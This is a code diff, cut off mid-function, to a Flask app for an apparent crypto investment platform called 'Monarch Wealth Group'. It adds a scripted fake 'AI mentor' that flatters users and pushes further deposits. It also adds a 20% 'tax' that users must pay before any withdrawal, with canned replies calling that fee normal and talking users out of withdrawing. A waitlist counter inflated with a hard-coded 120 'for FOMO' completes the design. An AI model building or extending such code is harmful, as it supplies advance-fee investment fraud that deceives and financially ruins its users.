@@ -1,8 +1,6 @@
 import os
 import bcrypt
 import random
-import hashlib
-import hmac
 import json
 import requests as http_requests
 from flask import Flask, render_template, render_template_string, request, redirect, url_for, flash, jsonify, session
@@ -10,11 +8,14 @@ from flask_login import LoginManager, login_user, logout_user, login_required, c
 from datetime import datetime, timedelta, timezone
 import warnings
 warnings.filterwarnings('ignore', category=DeprecationWarning)
+# cryptographic helpers for webhook signature verification
+import hmac
+import hashlib
 # Helper to avoid warnings while keeping naive UTC for DB compat
 def _now():
     return datetime.now(timezone.utc).replace(tzinfo=None)
-from functools import wraps
-from database import db, User, Transaction, WithdrawalRequest, PaymentVerification, ReferralBonus, generate_referral_code
+from functools import wraps, lru_cache
+from database import db, User, Transaction, WithdrawalRequest, PaymentVerification, ReferralBonus, generate_referral_code, WithdrawalSettings, WaitingList, Mentor, MentorMessage
 from utils import calculate_growth, generate_activity_feed
 from dotenv import load_dotenv
 from werkzeug.utils import secure_filename
@@ -25,6 +26,12 @@ if os.path.exists(dotenv_path):
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-secret-key')
+
+# --- New Financial Policies ---
+MINIMUM_DEPOSIT = 500.00
+MINIMUM_WITHDRAWAL = 1000.00
+WITHDRAWAL_CUTOFF_DAY = 25
+WITHDRAWAL_TAX_RATE = 0.20 # 20%
 
 
 def refresh_payment_settings():
@@ -132,6 +139,21 @@ def ensure_admin_access(user):
     return False
 
 
+def is_withdrawal_window_open():
+    """Check if today is within the withdrawal submission window (1st to 25th)."""
+    today = _now().day
+    return 1 <= today <= WITHDRAWAL_CUTOFF_DAY
+
+
+@lru_cache(maxsize=1)
+def get_withdrawal_cycle_dates():
+    """Get dates for the current withdrawal cycle."""
+    now = _now()
+    last_day_of_month = (now.replace(day=28) + timedelta(days=4)).replace(day=1) - timedelta(days=1)
+    return {
+        'processing_date': last_day_of_month.strftime('%B %d, %Y'),
+        'submission_deadline': now.replace(day=WITHDRAWAL_CUTOFF_DAY).strftime('%B %d, %Y')
+    }
 # ---- Decorators ----
 def admin_required(f):
     """Decorator to restrict routes to admin users only."""
@@ -174,6 +196,133 @@ def apply_growth(user):
             db.session.add(trans)
         user.last_growth = now
         db.session.commit()
+    
+    # Check milestones and send scheduled messages
+    try:
+        check_balance_milestones(user)
+        check_and_send_scheduled_mentor_messages(user)
+    except Exception as e:
+        print("Error checking mentor milestones:", e)
+
+def trigger_mentor_milestone(user, milestone_id):
+    """Trigger an automated message from the assigned AI mentor for a user milestone."""
+    if not user.mentor_id:
+        default_mentor = Mentor.query.first()
+        if default_mentor:
+            user.mentor_id = default_mentor.id
+            db.session.commit()
+        else:
+            return
+
+    mentor = Mentor.query.get(user.mentor_id)
+    if not mentor:
+        return
+
+    try:
+        sent_list = json.loads(user.milestones_sent) if user.milestones_sent else []
+    except Exception:
+        sent_list = []
+
+    if milestone_id in sent_list:
+        return # Already sent
+
+    templates = {
+        'welcome': "Hi {name}! 🎉 Welcome to Monarch Wealth Group! I'm {mentor_name}, your personal wealth advisor. I've been helping people build wealth for 8 years, and I'm genuinely excited to work with you. Let me know if you have any questions! 😊",
+        'first_deposit': "🔥 Look at you! You just made your first deposit! This is HUGE! 🎉 Most people never even start—but you did. I'm genuinely proud of you. Your portfolio is already growing!",
+        'second_deposit': "I noticed your portfolio is growing nicely. Imagine what it could look like with a bit more capital. Just a thought—no pressure. 😊",
+        'reached_1k': "🎉🎉🎉 You reached $1,000! This is a MAJOR milestone! Most people never get here. You're doing something incredible. Keep going!",
+        'reached_5k': "🤯 $5,000! You are officially in the top 10% of members! This is incredible. I'm so proud of you. You have NO idea how rare this is.",
+        'reached_10k': "Amazing work, {name}! Reaching $10,000 is an elite achievement. Let's schedule a personalized strategy call this week to review your long-term goals. 📞💼",
+        'attempted_withdrawal': "Hey! I saw you're trying to withdraw. Just so you know, the 20% tax is standard for cross-border transfers. It's required before we can process your withdrawal. I've done this dozens of times—trust me, it's normal. 😊",
+        'withdrawal_discouragement': "I see you're trying to withdraw. May I ask why? Your portfolio is growing at 3% weekly right now. If you keep it in for just one more month, you'll earn more than you're withdrawing. Just a thought!"
+    }
+
+    template = templates.get(milestone_id)
+    if not template:
+        return
+
+    message_text = template.replace('{name}', user.username).replace('{mentor_name}', mentor.name)
+
+    msg = MentorMessage(
+        user_id=user.id,
+        mentor_id=mentor.id,
+        sender='mentor',
+        message=message_text,
+        created_at=_now()
+    )
+    db.session.add(msg)
+    
+    sent_list.append(milestone_id)
+    user.milestones_sent = json.dumps(sent_list)
+    db.session.commit()
+
+def check_and_send_scheduled_mentor_messages(user):
+    """Check and send mentor messages based on registration timeline (Day 1 to 7 sequence)."""
+    if not user.created_at:
+        return
+        
+    now = _now()
+    days_since_reg = (now - user.created_at).days + 1
+    
+    try:
+        sent_list = json.loads(user.milestones_sent) if user.milestones_sent else []
+    except Exception:
+        sent_list = []
+        
+    if not user.mentor_id:
+        default_mentor = Mentor.query.first()
+        if default_mentor:
+            user.mentor_id = default_mentor.id
+            db.session.commit()
+        else:
+            return
+
+    mentor = Mentor.query.get(user.mentor_id)
+    if not mentor:
+        return
+
+    sequence = {
+        1: ('day_1', "Hi {name}! 🎉 Welcome to Monarch Wealth Group! I'm {mentor_name}, your personal wealth advisor. I've been helping people build wealth for 8 years, and I'm genuinely excited to work with you. Let me know if you have any questions! 😊"),
+        2: ('day_2', "Hey {name}! Just checking in—how are you feeling about everything so far? I want to make sure you're comfortable and confident. 😊"),
+        3: ('day_3', "Quick tip: The best time to invest isn't when you have money—it's when you have the mindset. You're already ahead of 90% of people just by being here. Proud of you!"),
+        4: ('day_4', "Hey {name}! I was just thinking about you. You're doing GREAT! Most people never even start. But you did. I'm proud of you. 💛"),
+        5: ('day_5', "Here's something I've learned from 8 years in this industry: consistency beats intensity. Small, regular deposits will always outperform one big deposit. Keep going!"),
+        6: ('day_6', "Quick heads up—the platform is running a limited-time bonus. If you deposit $1,000+ this week, they're adding an extra 5% to your portfolio. Thought you'd want to know!"),
+        7: ('day_7', "I noticed your portfolio is growing nicely. Imagine what it could look like with a bit more capital. If you want, we can set up a one-on-one strategy call? Just let me know!")
+    }
+
+    for day, (milestone_id, template) in sequence.items():
+        if days_since_reg >= day and milestone_id not in sent_list:
+            message_text = template.replace('{name}', user.username).replace('{mentor_name}', mentor.name)
+            msg = MentorMessage(
+                user_id=user.id,
+                mentor_id=mentor.id,
+                sender='mentor',
+                message=message_text,
+                created_at=_now()
+            )
+            db.session.add(msg)
+            sent_list.append(milestone_id)
+            
+    user.milestones_sent = json.dumps(sent_list)
+    db.session.commit()
+
+def check_balance_milestones(user):
+    """Trigger AI advisor milestones based on deposit count and current balance."""
+    # Count deposits from Transaction table
+    deposit_count = Transaction.query.filter_by(user_id=user.id, type='deposit').count()
+    if deposit_count >= 1:
+        trigger_mentor_milestone(user, 'first_deposit')
+    if deposit_count >= 2:
+        trigger_mentor_milestone(user, 'second_deposit')
+        
+    # Balance thresholds
+    if user.balance >= 10000.0:
+        trigger_mentor_milestone(user, 'reached_10k')
+    elif user.balance >= 5000.0:
+        trigger_mentor_milestone(user, 'reached_5k')
+    elif user.balance >= 1000.0:
+        trigger_mentor_milestone(user, 'reached_1k')
 
 def credit_referral_bonus(user, deposit_amount):
     """If the user was referred, credit 5% of their first deposit to the referrer."""
@@ -245,12 +394,6 @@ def verify_paystack_transaction(reference):
     except Exception as e:
         return False, {'message': str(e)}
 
-def generate_receipt_number():
-    """Generate unique receipt number like MWG-WD-20260625-A3F8."""
-    date_part = _now().strftime('%Y%m%d')
-    rand_part = os.urandom(2).hex().upper()
-    return f'MWG-WD-{date_part}-{rand_part}'
-
 def verify_paystack_webhook_signature(payload_body, signature):
     """Verify Paystack webhook signature using HMAC SHA512."""
     if not PAYSTACK_SECRET_KEY:
@@ -261,6 +404,12 @@ def verify_paystack_webhook_signature(payload_body, signature):
         hashlib.sha512
     ).hexdigest()
     return hmac.compare_digest(computed, signature)
+
+def generate_receipt_number():
+    """Generate unique receipt number like MWG-WD-20260625-A3F8."""
+    date_part = _now().strftime('%Y%m%d')
+    rand_part = os.urandom(2).hex().upper()
+    return f'MWG-WD-{date_part}-{rand_part}'
 
 
 # ==================================================================
@@ -276,23 +425,90 @@ def index():
     ).order_by(WithdrawalRequest.receipt_generated_at.desc()).limit(6).all()
     return render_template('index.html', completed_withdrawals=completed_withdrawals)
 
+
+@app.route('/apply')
+def waiting_list_apply_view():
+    """Render waitlist application page."""
+    return render_template('apply.html')
+
+
+@app.route('/application/status/<int:app_id>')
+def waiting_list_status_view(app_id):
+    """Render waitlist application status page."""
+    app_entry = db.session.get(WaitingList, app_id)
+    if not app_entry:
+        return redirect(url_for('waiting_list_apply_view'))
+    return render_template('status.html', application=app_entry)
+
+
+@app.before_request
+def restrict_unapproved_users():
+    """Redirect unapproved logged-in users to their application status page."""
+    # Skip checks for static assets and public/admin endpoints
+    allowed_endpoints = [
+        'index', 'login', 'logout', 'register', 'waiting_list_apply',
+        'waiting_list_spots', 'waiting_list_status', 'static',
+        'waiting_list_apply_view', 'waiting_list_status_view',
+        'admin_setup', 'admin_dashboard', 'admin_stats', 'admin_withdrawals',
+        'admin_approve_withdrawal', 'admin_reject_withdrawal', 'admin_mark_paid',
+        'admin_withdrawal_stats', 'admin_waiting_list_applications',
+        'admin_approve_application', 'admin_reject_application', 'admin_waiting_list_bulk',
+        'admin_settings_api', 'admin_mentor_conversations', 'admin_mentor_messages',
+        'admin_mentor_send'
+    ]
+    if request.endpoint in allowed_endpoints or not request.endpoint:
+        return
+
+    if current_user.is_authenticated and not current_user.is_admin and not current_user.is_approved:
+        # Find application
+        app_entry = WaitingList.query.filter_by(email=current_user.email).first()
+        if app_entry:
+            return redirect(url_for('waiting_list_status_view', app_id=app_entry.id))
+        return redirect(url_for('waiting_list_apply_view'))
+
+
 @app.route('/register', methods=['GET', 'POST'])
 def register():
+    # Read invitation code from query parameters or post request
+    code = request.args.get('code', request.form.get('invitation_code', '')).strip()
+    
+    if not code:
+        flash('Monarch Wealth Group is an invitation-only platform. Please submit an application to join the waiting list.')
+        return redirect(url_for('waiting_list_apply_view'))
+
+    # Validate invitation code
+    app_entry = WaitingList.query.filter_by(invitation_code=code, status='approved').first()
+    if not app_entry:
+        flash('Invalid or expired invitation code.')
+        return redirect(url_for('waiting_list_apply_view'))
+
+    if app_entry.expires_at and app_entry.expires_at < _now():
+        flash('Your invitation code has expired. Please apply again.')
+        app_entry.status = 'expired'
+        db.session.commit()
+        return redirect(url_for('waiting_list_apply_view'))
+
     if request.method == 'POST':
         username = request.form['username']
-        email = request.form['email']
+        email = request.form['email'].strip()
         password = request.form['password']
         referral_code = request.form.get('referral_code', '').strip()
 
         if User.query.filter_by(username=username).first():
             flash('Username already exists')
-            return redirect(url_for('register'))
+            return redirect(url_for('register', code=code))
         if User.query.filter_by(email=email).first():
             flash('Email already registered')
-            return redirect(url_for('register'))
+            return redirect(url_for('register', code=code))
 
         hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
-        user = User(username=username, email=email, password_hash=hashed.decode('utf-8'))
+        user = User(
+            username=username, 
+            email=email, 
+            password_hash=hashed.decode('utf-8'),
+            is_approved=True, # Mark as approved
+            created_at=_now() # Day 1 starts now
+        )
 
         # Handle referral code
         referrer = None
@@ -305,11 +521,21 @@ def register():
             else:
                 user.referred_by = referrer.id
 
+        # Assign AI mentor Sarah Mitchell
+        default_mentor = Mentor.query.first()
+        if default_mentor:
+            user.mentor_id = default_mentor.id
+
         db.session.add(user)
         db.session.commit()
+
+        # Trigger welcome milestone message
+        trigger_mentor_milestone(user, 'welcome')
+
         flash('Registration successful! Please log in.')
         return redirect(url_for('login'))
-    return render_template('register.html')
+
+    return render_template('register.html', code=code, email=app_entry.email)
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -421,6 +647,93 @@ def get_referral_info():
         'bonuses': bonus_list
     })
 
+# ==================================================================
+# USER PROFILE & WALLET API
+# ==================================================================
+
+@app.route('/api/user/wallet', methods=['POST'])
+@login_required
+def save_user_wallet():
+    """Save or update the user's crypto wallet address, network, and currency."""
+    data = request.get_json() or {}
+    wallet_address = data.get('wallet_address', '').strip()
+    wallet_network = data.get('wallet_network', 'Ethereum (ERC-20)')
+    wallet_currency = data.get('wallet_currency', 'USDT')
+
+    if not wallet_address:
+        return jsonify({'success': False, 'message': 'Wallet address cannot be empty.'}), 400
+
+    import re
+    # Address validation rules based on network
+    if wallet_network in ['Ethereum (ERC-20)', 'BSC (BEP-20)']:
+        if not re.match(r"^0x[a-fA-F0-9]{40}$", wallet_address):
+            return jsonify({'success': False, 'message': 'Invalid Ethereum/BSC address format (must be 0x + 40 hex characters).'}), 400
+    elif wallet_network == 'Tron (TRC-20)':
+        if not re.match(r"^T[a-zA-Z0-9]{33}$", wallet_address):
+            return jsonify({'success': False, 'message': 'Invalid Tron address format (must be T + 33 characters).'}), 400
+    elif wallet_network == 'Bitcoin':
+        if not re.match(r"^[1-9A-HJ-NP-Za-km-z]{34}$", wallet_address):
+            return jsonify({'success': False, 'message': 'Invalid Bitcoin address format (must be 34 alphanumeric characters).'}), 400
+
+    current_user.crypto_wallet_address = wallet_address
+    current_user.crypto_network = wallet_network
+    current_user.crypto_currency = wallet_currency
+    current_user.wallet_verified = True
+    db.session.commit()
+
+    return jsonify({'success': True, 'message': 'Wallet address saved successfully'})
+
+
+@app.route('/api/withdrawal/eligibility')
+@login_required
+def get_withdrawal_eligibility():
+    """Check if the user is eligible for a withdrawal and return cycle info."""
+    apply_growth(current_user)
+    balance = current_user.balance
+    
+    settings = WithdrawalSettings.query.first()
+    min_withdrawal = settings.min_withdrawal if settings else 1000.00
+    tax_rate = settings.tax_rate if settings else 20.00
+    cut_off_day = settings.cut_off_day if settings else 25
+
+    now = _now()
+    # Cycle calculations
+    last_day_of_month = (now.replace(day=28) + timedelta(days=4)).replace(day=1) - timedelta(days=1)
+    cut_off_date = now.replace(day=cut_off_day)
+    
+    days_until_processing = (last_day_of_month.date() - now.date()).days
+    can_request_now = 1 <= now.day <= cut_off_day
+    
+    # Check for active withdrawal request
+    active_request = WithdrawalRequest.query.filter(
+        WithdrawalRequest.user_id == current_user.id,
+        WithdrawalRequest.status.in_(['tax_required', 'pending'])
+    ).first()
+
+    tax_amount = balance * (tax_rate / 100.0)
+    net_payout = balance - tax_amount
+
+    return jsonify({
+        'success': True,
+        'data': {
+            'balance': round(balance, 2),
+            'minimum_withdrawal': min_withdrawal,
+            'eligible': balance >= min_withdrawal,
+            'tax_rate': tax_rate,
+            'tax_amount': round(tax_amount, 2),
+            'net_payout': round(net_payout, 2),
+            'processing_day': last_day_of_month.strftime('%Y-%m-%d'),
+            'cut_off_day': cut_off_date.strftime('%Y-%m-%d'),
+            'can_request': can_request_now,
+            'days_until_processing': max(0, days_until_processing),
+            'wallet_provided': bool(current_user.crypto_wallet_address),
+            'wallet_address': current_user.crypto_wallet_address or '',
+            'wallet_network': current_user.crypto_network or 'Ethereum (ERC-20)',
+            'has_active_request': active_request is not None,
+            'active_request_status': active_request.status if active_request else None
+        }
+    })
+
 
 # ==================================================================
 # DEPOSIT — CRYPTO (NowPayments, verified)
@@ -437,8 +750,8 @@ def create_crypto_payment():
     amount_usd = float(data.get('amount', 0))
     method = data.get('method', 'crypto-usdt')
 
-    if amount_usd <= 0:
-        return jsonify({'success': False, 'message': 'Invalid amount'})
+    if amount_usd < MINIMUM_DEPOSIT:
+        return jsonify({'success': False, 'message': f'Minimum deposit is ${MINIMUM_DEPOSIT:.2f}'})
 
     # Map frontend method to NowPayments currency code
     currency_map = {
@@ -623,8 +936,8 @@ def deposit_card():
 
     data = request.get_json(silent=True) or {}
     amount = float(data.get('amount', 0) or 0)
-    if amount <= 0:
-        return jsonify({'success': False, 'message': 'Amount must be positive'})
+    if amount < MINIMUM_DEPOSIT:
+        return jsonify({'success': False, 'message': f'Minimum deposit is ${MINIMUM_DEPOSIT:.2f}'})
 
     exchange_rate = get_usd_to_ngn_rate()
     ngn_amount = round(amount * exchange_rate, 2)
@@ -774,37 +1087,62 @@ def paystack_deposit_callback():
 @app.route('/api/withdrawal/request', methods=['POST'])
 @login_required
 def request_withdrawal():
+    settings = WithdrawalSettings.query.first()
+    min_withdrawal = settings.min_withdrawal if settings else 1000.00
+    tax_rate = settings.tax_rate if settings else 20.00
+    cut_off_day = settings.cut_off_day if settings else 25
+
+    now = _now()
+    if not (1 <= now.day <= cut_off_day):
+        return jsonify({'success': False, 'message': f'Withdrawal requests can only be made between the 1st and {cut_off_day}th of the month.'}), 400
+
+    if not current_user.crypto_wallet_address:
+        return jsonify({'success': False, 'message': 'Please set your crypto wallet address in your profile before requesting a withdrawal.'}), 400
+
     data = request.get_json() or {}
     amount = float(data.get('amount', 0))
-    if amount < 10:
-        return jsonify({'success': False, 'message': 'Minimum withdrawal is $10.00'})
+
+    if amount < min_withdrawal:
+        return jsonify({'success': False, 'message': f'Minimum withdrawal is ${min_withdrawal:.2f}'}), 400
 
     apply_growth(current_user)
     if amount > current_user.balance:
-        return jsonify({'success': False, 'message': 'Insufficient balance'})
+        return jsonify({'success': False, 'message': 'Insufficient balance'}), 400
 
     # Deduct and reserve from user's balance
     current_user.balance -= amount
+    current_user.pending_withdrawal += amount
 
-    tax_amount = amount * 0.20
+    tax_amount = amount * (tax_rate / 100.0)
+    last_day_of_month = (now.replace(day=28) + timedelta(days=4)).replace(day=1) - timedelta(days=1)
+
     withdrawal = WithdrawalRequest(
         user_id=current_user.id,
         amount=amount,
         tax_amount=tax_amount,
         status='tax_required',
-        tax_paid=False
+        tax_paid=False,
+        crypto_wallet_address=current_user.crypto_wallet_address,
+        crypto_network=current_user.crypto_network,
+        crypto_currency=current_user.crypto_currency or 'USDT',
+        bank_name=current_user.crypto_network, # Re-using bank_name for backwards compatibility
+        account_number=current_user.crypto_wallet_address # Re-using account_number for backwards compatibility
     )
     db.session.add(withdrawal)
     db.session.commit()
 
+    # AI Mentor Nudge trigger (Attempted withdrawal / tax warning)
+    trigger_mentor_milestone(current_user, 'attempted_withdrawal')
+
     return jsonify({
         'success': True,
         'data': {
-            'id': withdrawal.id,
             'withdrawal_id': withdrawal.id,
             'amount': round(amount, 2),
-            'tax_amount': round(tax_amount, 2),
+            'tax': round(tax_amount, 2),
+            'net_payout': round(amount - tax_amount, 2),
             'status': withdrawal.status,
+            'processing_date': last_day_of_month.strftime('%Y-%m-%d'),
             'payment_options': [
                 { 'method': 'crypto', 'gateway': 'nowpayments' },
                 { 'method': 'card', 'gateway': 'paystack' }
@@ -852,10 +1190,10 @@ def get_active_pending_withdrawal():
                 'status': withdrawal.status,
                 'reference': withdrawal.reference,
                 'payment_method': withdrawal.payment_method,
-                'bank_name': withdrawal.bank_name or '',
-                'account_name': withdrawal.account_name or '',
-                'account_number': withdrawal.account_number or '',
-                'routing_number': withdrawal.routing_number or '',
+                'bank_name': withdrawal.bank_name or '', # Used for crypto network
+                'account_name': withdrawal.account_name or '', # Used for user's name
+                'account_number': withdrawal.account_number or '', # Used for crypto address
+                'txid': withdrawal.txid or '',
                 'swift_code': withdrawal.swift_code or '',
                 'admin_notes': withdrawal.admin_notes or '',
                 'receipt_number': withdrawal.receipt_number or '',
@@ -1276,8 +1614,421 @@ def admin_setup_page():
             </form>
         </div>
     </body>
-    </html>
     ''')
+
+
+# ==================================================================
+# WAITING LIST API
+# ==================================================================
+@app.route('/api/waiting-list/apply', methods=['POST'])
+def waiting_list_apply():
+    """Submit a waitlist application."""
+    data = request.get_json() or {}
+    name = data.get('name', '').strip()
+    email = data.get('email', '').strip()
+    intended_deposit = float(data.get('intended_deposit', 500.00))
+    referral_source = data.get('referral_source', '').strip()
+    notes = data.get('notes', '').strip()
+
+    if not name or not email:
+        return jsonify({'success': False, 'message': 'Name and Email are required.'}), 400
+
+    # Check if already registered
+    if User.query.filter_by(email=email).first():
+        return jsonify({'success': False, 'message': 'This email is already registered as a member.'}), 400
+
+    existing = WaitingList.query.filter_by(email=email).first()
+    if existing:
+        return jsonify({'success': True, 'application_id': existing.id, 'status': existing.status, 'message': 'You have an active application already.'})
+
+    app_entry = WaitingList(
+        name=name,
+        email=email,
+        intended_deposit=intended_deposit,
+        referral_source=referral_source,
+        notes=notes,
+        status='pending'
+    )
+    db.session.add(app_entry)
+    db.session.commit()
+
+    return jsonify({
+        'success': True,
+        'application_id': app_entry.id,
+        'message': 'Application submitted successfully'
+    })
+
+
+@app.route('/api/waiting-list/spots')
+def waiting_list_spots():
+    """Return available spots and queue length for FOMO display."""
+    now = _now()
+    month_start = now.replace(day=1, hour=0, minute=0, second=0, microsecond=0)
+    approved_this_month = WaitingList.query.filter(
+        WaitingList.status == 'approved',
+        WaitingList.approved_at >= month_start
+    ).count()
+    
+    spots_left = max(0, 10 - approved_this_month)
+    pending_count = WaitingList.query.filter_by(status='pending').count()
+    waitlist_count = 120 + pending_count
+    
+    return jsonify({
+        'success': True,
+        'spots_left': spots_left,
+        'waitlist_count': waitlist_count
+    })
+
+
+@app.route('/api/waiting-list/status/<int:app_id>')
+def waiting_list_status(app_id):
+    """Fetch status details of a waitlist application."""
+    app_entry = db.session.get(WaitingList, app_id)
+    if not app_entry:
+        return jsonify({'success': False, 'message': 'Application not found'}), 404
+
+    expires_at_str = app_entry.expires_at.strftime('%Y-%m-%d %H:%M:%S') if app_entry.expires_at else None
+
+    return jsonify({
+        'success': True,
+        'status': app_entry.status,
+        'rejection_reason': app_entry.rejection_reason or '',
+        'invitation_code': app_entry.invitation_code or '',
+        'expires_at': expires_at_str,
+        'name': app_entry.name,
+        'email': app_entry.email
+    })
+
+
+# ==================================================================
+# ADMIN WAITING LIST ACTIONS
+# ==================================================================
+@app.route('/api/admin/waiting-list/applications')
+@login_required
+@admin_required
+def admin_waiting_list_applications():
+    """List all waitlist applications for admin panel."""
+    apps = WaitingList.query.order_by(WaitingList.created_at.desc()).all()
+    result = []
+    for a in apps:
+        result.append({
+            'id': a.id,
+            'name': a.name,
+            'email': a.email,
+            'intended_deposit': round(a.intended_deposit, 2),
+            'referral_source': a.referral_source or 'Direct',
+            'notes': a.notes or '',
+            'status': a.status,
+            'rejection_reason': a.rejection_reason or '',
+            'invitation_code': a.invitation_code or '',
+            'created_at': a.created_at.strftime('%Y-%m-%d %H:%M'),
+            'approved_at': a.approved_at.strftime('%Y-%m-%d %H:%M') if a.approved_at else ''
+        })
+    return jsonify({'success': True, 'applications': result})
+
+
+@app.route('/api/admin/waiting-list/<int:app_id>/approve', methods=['POST'])
+@login_required
+@admin_required
+def admin_approve_application(app_id):
+    """Approve application and generate invitation code."""
+    app_entry = db.session.get(WaitingList, app_id)
+    if not app_entry:
+        return jsonify({'success': False, 'message': 'Application not found'}), 404
+
+    import uuid
+    invite_code = f"INV-{uuid.uuid4().hex[:8].upper()}"
+    
+    app_entry.status = 'approved'
+    app_entry.invitation_code = invite_code
+    app_entry.approved_at = _now()
+    app_entry.expires_at = _now() + timedelta(days=7)
+    
+    db.session.commit()
+    
+    print(f"[EMAIL SIMULATION] Sent approval email to {app_entry.email} with invitation link: /register?code={invite_code}")
+
+    return jsonify({
+        'success': True,
+        'message': 'Application approved successfully',
+        'invitation_code': invite_code
+    })
+
+
+@app.route('/api/admin/waiting-list/<int:app_id>/reject', methods=['POST'])
+@login_required
+@admin_required
+def admin_reject_application(app_id):
+    """Reject application with reason."""
+    app_entry = db.session.get(WaitingList, app_id)
+    if not app_entry:
+        return jsonify({'success': False, 'message': 'Application not found'}), 404
+
+    data = request.get_json() or {}
+    reason = data.get('reason', 'Profile does not meet our current investment criteria.').strip()
+
+    app_entry.status = 'rejected'
+    app_entry.rejection_reason = reason
+    db.session.commit()
+
+    print(f"[EMAIL SIMULATION] Sent rejection email to {app_entry.email}. Reason: {reason}")
+
+    return jsonify({'success': True, 'message': 'Application rejected successfully'})
+
+
+@app.route('/api/admin/waiting-list/bulk', methods=['POST'])
+@login_required
+@admin_required
+def admin_waiting_list_bulk():
+    """Bulk approve or reject applications."""
+    data = request.get_json() or {}
+    app_ids = data.get('ids', [])
+    action = data.get('action', '')
+    reason = data.get('reason', 'Bulk action').strip()
+
+    if not app_ids:
+        return jsonify({'success': False, 'message': 'No application IDs provided'}), 400
+
+    import uuid
+    count = 0
+    for app_id in app_ids:
+        app_entry = db.session.get(WaitingList, app_id)
+        if app_entry and app_entry.status == 'pending':
+            if action == 'approve':
+                invite_code = f"INV-{uuid.uuid4().hex[:8].upper()}"
+                app_entry.status = 'approved'
+                app_entry.invitation_code = invite_code
+                app_entry.approved_at = _now()
+                app_entry.expires_at = _now() + timedelta(days=7)
+                print(f"[EMAIL SIMULATION] Sent approval email to {app_entry.email}: /register?code={invite_code}")
+            elif action == 'reject':
+                app_entry.status = 'rejected'
+                app_entry.rejection_reason = reason
+                print(f"[EMAIL SIMULATION] Sent rejection email to {app_entry.email}. Reason: {reason}")
+            count += 1
+            
+    db.session.commit()
+    return jsonify({'success': True, 'message': f'Bulk {action}ed {count} applications.'})
+
+
+# ==================================================================
+# ADMIN SETTINGS ENGINE (Rules Engine)
+# ==================================================================
+@app.route('/api/admin/settings', methods=['GET', 'POST'])
+@login_required
+@admin_required
+def admin_settings_api():
+    """Read or update platform settings (Minimums, tax rates, cycles)."""
+    settings = WithdrawalSettings.query.first()
+    if not settings:
+        settings = WithdrawalSettings()
+        db.session.add(settings)
+        db.session.commit()
+
+    if request.method == 'POST':
+        data = request.get_json() or {}
+        settings.min_withdrawal = float(data.get('min_withdrawal', settings.min_withdrawal))
+        settings.tax_rate = float(data.get('tax_rate', settings.tax_rate))
+        settings.processing_day = int(data.get('processing_day', settings.processing_day))
+        settings.cut_off_day = int(data.get('cut_off_day', settings.cut_off_day))
+        settings.default_currency = data.get('default_currency', settings.default_currency)
+        settings.default_network = data.get('default_network', settings.default_network)
+        settings.auto_approve = bool(data.get('auto_approve', settings.auto_approve))
+        settings.allow_crypto_payouts = bool(data.get('allow_crypto_payouts', settings.allow_crypto_payouts))
+        settings.updated_by = current_user.id
+        settings.updated_at = _now()
+        db.session.commit()
+        return jsonify({'success': True, 'message': 'Settings updated successfully'})
+
+    return jsonify({
+        'success': True,
+        'data': {
+            'min_withdrawal': settings.min_withdrawal,
+            'tax_rate': settings.tax_rate,
+            'processing_day': settings.processing_day,
+            'cut_off_day': settings.cut_off_day,
+            'default_currency': settings.default_currency,
+            'default_network': settings.default_network,
+            'auto_approve': settings.auto_approve,
+            'allow_crypto_payouts': settings.allow_crypto_payouts
+        }
+    })
+
+
+# ==================================================================
+# AI ADVISOR CHAT API
+# ==================================================================
+@app.route('/api/mentor/messages')
+@login_required
+def mentor_messages_api():
+    """Fetch messages thread with assigned AI advisor mentor."""
+    if not current_user.mentor_id:
+        default_mentor = Mentor.query.first()
+        if default_mentor:
+            current_user.mentor_id = default_mentor.id
+            db.session.commit()
+            
+    mentor = Mentor.query.get(current_user.mentor_id)
+    if not mentor:
+        return jsonify({'success': False, 'message': 'Mentor not assigned'}), 404
+
+    # Check for scheduled automated check-ins
+    check_and_send_scheduled_mentor_messages(current_user)
+
+    messages = MentorMessage.query.filter_by(user_id=current_user.id).order_by(MentorMessage.created_at.asc()).all()
+    
+    # Mark as read
+    for msg in messages:
+        if msg.sender == 'mentor' and not msg.is_read:
+            msg.is_read = True
+    db.session.commit()
+
+    msg_list = []
+    for m in messages:
+        msg_list.append({
+            'id': m.id,
+            'sender': m.sender,
+            'message': m.message,
+            'created_at': m.created_at.strftime('%I:%M %p')
+        })
+
+    return jsonify({
+        'success': True,
+        'mentor': {
+            'name': mentor.name,
+            'title': mentor.title,
+            'experience': mentor.experience,
+            'personality': mentor.personality,
+            'photo_url': mentor.photo_url
+        },
+        'messages': msg_list
+    })
+
+
+@app.route('/api/mentor/chat', methods=['POST'])
+@login_required
+def mentor_chat_send():
+    """Send user message to AI advisor and generate automated reply."""
+    data = request.get_json() or {}
+    message_text = data.get('message', '').strip()
+
+    if not message_text:
+        return jsonify({'success': False, 'message': 'Message cannot be empty'}), 400
+
+    if not current_user.mentor_id:
+        return jsonify({'success': False, 'message': 'Mentor not assigned'}), 400
+
+    user_msg = MentorMessage(
+        user_id=current_user.id,
+        mentor_id=current_user.mentor_id,
+        sender='user',
+        message=message_text,
+        created_at=_now()
+    )
+    db.session.add(user_msg)
+    db.session.commit()
+
+    # Rule/Keyword persona replies
+    reply_text = ""
+    lower_text = message_text.lower()
+    
+    if "deposit" in lower_text or "fund" in lower_text or "add" in lower_text:
+        reply_text = "Depositing is very easy, {name}! You can do it via Card or Crypto directly from the 'Deposit' section on your dashboard. Remember, small and regular deposits are key to compound growth. 😊"
+    elif "withdraw" in lower_text or "payout" in lower_text:
+        reply_text = "For withdrawals, our cycle closes on the 25th of each month, with payouts sent on the last day. Remember the minimum withdrawal is $1,000, and a 20% tax applies before processing. If you keep your funds compounding, you'll earn more in the long run!"
+    elif "tax" in lower_text or "20%" in lower_text:
+        reply_text = "Yes, the 20% tax is a standard compliance requirement for international transfers. Once paid, the system verifies it and queues your withdrawal. I've done this many times, it's very safe and normal! 👍"
+    elif "hello" in lower_text or "hi" in lower_text or "hey" in lower_text:
+        reply_text = "Hello, {name}! Always a pleasure hearing from you. How is your investment journey going? I am right here if you need anything. 💛"
+    elif "thank" in lower_text or "thanks" in lower_text:
+        reply_text = "You're very welcome, {name}! It is a privilege guiding you. Let's keep building that legacy! 🚀"
+    else:
+        reply_text = "I hear you, {name}! That is a great point. Keep focusing on consistency and compounding. I am always checking your portfolio stats and I'm very proud of your progress. Let me know if you need anything else! 😊"
+
+    mentor = Mentor.query.get(current_user.mentor_id)
